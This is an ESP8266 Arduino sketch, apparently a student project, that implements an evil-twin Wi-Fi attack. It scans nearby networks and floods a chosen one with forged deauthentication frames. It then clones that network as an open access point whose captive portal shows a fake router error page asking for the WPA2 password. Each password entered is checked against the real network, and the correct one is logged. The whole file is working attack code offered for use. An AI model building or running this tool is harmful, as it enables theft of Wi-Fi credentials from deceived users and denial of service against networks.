#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "URGENT: IMMEDIATE ACTION REQUIRED"
#define TITLE "<error style='text-shadow: 1px 1px black;color:red;font-size:7vw;'>&#9888;</error> Critical System Error"
#define BODY "Attention: Your router has encountered a critical error while attempting to connect to the WiFi network. This issue may compromise the security and functionality of your device.<br><br>To resolve this issue and restore normal operation, please verify your WiFi password immediately."
//                                               or use this 

// #define SUBTITLE "ACCESS POINT RESCUE MODE"
// #define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
// #define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."


String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #f32013; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved IEEE802.11 .</a></div>";
}

String index() {// password constrints
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>SSID WPA2 Password :</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

void setup() {

  Serial.begin(115200);//run baud
  WiFi.mode(WIFI_AP_STA);//both station and ap modes
  wifi_promiscuous_enable(1);// cpature packets
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));//starts the AP,
  //                       ip                      gateway                     subnet
  WiFi.softAP("BCSE308L", "1s333y0urpass");//ssid and password
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));//start dns server

  webServer.on("/", handleIndex);//all domains
  webServer.on("/result", handleResult);// after click 
  webServer.on("/admin", handleAdmin);// befr click
  webServer.onNotFound(handleIndex);// if not found redirect to index
  webServer.begin();//start server
}
//_______________________Scans for networks_________________________________________________________________________________________
void performScan() {
  int n = WiFi.scanNetworks();//count of all found networks ,even hidden networks
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {// since there is only 14  channel
      _Network network;
      network.ssid = WiFi.SSID(i);// ssid
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];//6 byte mac or bssid
      }

      network.ch = WiFi.channel(i);//channel
      _networks[i] = network;//store in struct
    }
  }
}

bool hotspot_active = false;// captive portal
bool deauthing_active = false;// deauth mode

void handleResult() {
  String html = "";
  // -----------------------------------------------------------------------------------------------------------
  // if (WiFi.status() != WL_CONNECTED) {
  //   if (webServer.arg("deauth") == "start") {
  //     deauthing_active = true;
  //   }
  //   webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
  //   Serial.println("victim entered wrong password");// serial monitor 
  // -----------------------------------------------------------------------------------------------------------
  int attempts_left = 5; // Initialize the number of attempts
  if (WiFi.status() != WL_CONNECTED) {
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
      attempts_left--; // Decrement the number of attempts left
      if (attempts_left <= 0) {

      //=====================CAPTIVE PORTAL BEGINS ENTRY (SECOND) PAGE==================
      
        webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Too many wrong attempts</h2><p>Please, try again later.</p></center></body> </html>");
      } else {
        webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Attempts left: " + String(attempts_left) + "</p></center></body> </html>");
      }
      Serial.println("Attacked user entered a wrong password! Attempts left: " + String(attempts_left)); // serial monitor
  }
  else {
    _correct = "Successfully fetched password for: " + _selectedNetwork.ssid + ", Password: " + _tryPassword;
    hotspot_active = false;// stop server and hotspot mode, switch back to BCSE308L
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);//stop and disconnect the AP
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("BCSE308L", "1s333y0urpass");//ssid and password
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("B1ng00! Attacked user entered correct password!");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>MAC/BSSID</th><th>Channel</th><th>F0und</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {// select the accesspointt
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }
//// dauth button click
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();//stop the 192.168.4.1
      int n = WiFi.softAPdisconnect (true);//disconnect US
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());//Captive portal ssid
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("BCSE308L", "1s333y0urpass");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      // display it
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #FF5733;'>Picked</button></form></td></tr>";
      } else {
        _html += "<button>Pick</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");//BUTTON CHNG
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Begin Deauth");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop Captive");//BUTTON CHNG
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start Captive");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {// no network selected/ empty in range/ pin rst
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";// FINISH OFF the window

    if (_correct != "") {
      _html += "</br><h2>" + _correct + "</h2>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);//send the html to the browser

  } else {

    if (webServer.hasArg("password")) {//NO PASSWORD TYPED OR SENDED
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
     //=====================CAPTIVE PORTAL BEGINS WRONG PASS PAGE==================
      
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Authenticating Connection, please hold...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {//====================================================================SEEE RESULT CALLED HERE==================================
      deauthing_active = true;
      }
    } else {//--------- START THE CAPTIVE PORTAL
      //=====================CAPTIVE PORTAL BEGINS FIRST PAGE==================
      webServer.send(200, "text/html", index());//====================================================================SEEE INDEX CALLED HERE==================================
    }
  }

}

// void handleAdmin() {

//   String _html = _tempHTML;

//   if (webServer.hasArg("ap")) {
//     for (int i = 0; i < 16; i++) {
//       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
//         _selectedNetwork = _networks[i];
//       }
//     }
//   }

//   if (webServer.hasArg("deauth")) {
//     if (webServer.arg("deauth") == "start") {
//       deauthing_active = true;
//     } else if (webServer.arg("deauth") == "stop") {
//       deauthing_active = false;
//     }
//   }

//   if (webServer.hasArg("hotspot")) {
//     if (webServer.arg("hotspot") == "start") {
//       hotspot_active = true;

//       dnsServer.stop();
//       int n = WiFi.softAPdisconnect (true);
//       Serial.println(String(n));
//       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
//       WiFi.softAP(_selectedNetwork.ssid.c_str());
//       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

//     } else if (webServer.arg("hotspot") == "stop") {
//       hotspot_active = false;
//       dnsServer.stop();
//       int n = WiFi.softAPdisconnect (true);
//       Serial.println(String(n));
//       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
//       WiFi.softAP("BCSE308L", "1s333y0urpass");
//       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
//     }
//     return;
//   }

//   for (int i = 0; i < 16; ++i) {
//     if ( _networks[i].ssid == "") {
//       break;
//     }
//     _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
//     //==================================================================================================================================================================SEE AP ARGUMENT===========

//     if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
//       _html += "<button style='background-color: #FF5733;'>Picked</button></form></td></tr>";
//     } else {
//       _html += "<button>Pick</button></form></td></tr>";
//     }
//   }

//   if (deauthing_active) {
//     _html.replace("{deauth_button}", "Stop deauthing");
//     _html.replace("{deauth}", "stop");
//   } else {
//     _html.replace("{deauth_button}", "Start deauthing");
//     _html.replace("{deauth}", "start");
//   }

//   if (hotspot_active) {
//     _html.replace("{hotspot_button}", "Stop EvilTwin");
//     _html.replace("{hotspot}", "stop");
//   } else {
//     _html.replace("{hotspot_button}", "Start EvilTwin");
//     _html.replace("{hotspot}", "start");
//   }


//   if (_selectedNetwork.ssid == "") {
//     _html.replace("{disabled}", " disabled");
//   } else {
//     _html.replace("{disabled}", "");
//   }

//   if (_correct != "") {
//     _html += "</br><h3>" + _correct + "</h3>";
//   }

//   _html += "</table></div></body></html>";
//   webServer.send(200, "text/html", _html);

// }

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();// redir evything to esp
  webServer.handleClient();// handle all http reqs , all clicks -POST , GET

  if (deauthing_active && millis() - deauth_now >= 1000) {// 
  // _______________________________________________________________________________
  // IF DEAUTH STARTED AND MILLISECOND - DEAUTH_NOW >= 1000, IF MORE THAN 1 SECOND , AGAIN

    wifi_set_channel(_selectedNetwork.ch);// RESELECT THE CHANNEL TO BE ATTACKED

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    //The packet is an array of 26 bytes, 
    
    // 0xC0, 0x00: The frame control field, where 0xC0 signifies a deauthentication frame in Wi-Fi protocols.
    // 0x00, 0x00: Duration field, often set to zero for deauthentication.


    // 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF: BROADCAST DESTNIATION ADDRESS OF CHANNEL.


    // 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF: The source MAC address; 
    // 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF: The BSSID
    // 0x00, 0x00: Sequence control field, set to zero here, but could be incremented for multiple packets.

    // 0x01, 0x00: Reason code, 0x01 indicates a standard deauthentication due to "unspecified reasons."


    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);// The source MAC address; 
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);// Source BSSID

    deauthPacket[24] = 1;// Reason code, 0x01 indicates a standard deauthentication due to "unspecified reasons."

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;// IN CASE 0xC0 DOESN'T WORK
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();// TIME OF SENDIN DEAUTH PACKET
  }

  if (millis() - now >= 15000) {
    performScan();//Scan every 15 secondds and updates _network array
    now = millis();
  }

  if (millis() - wifinow >= 2000) {// check every 2s
    if (WiFi.status() != WL_CONNECTED) {//checck if esp conntected to wifi
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
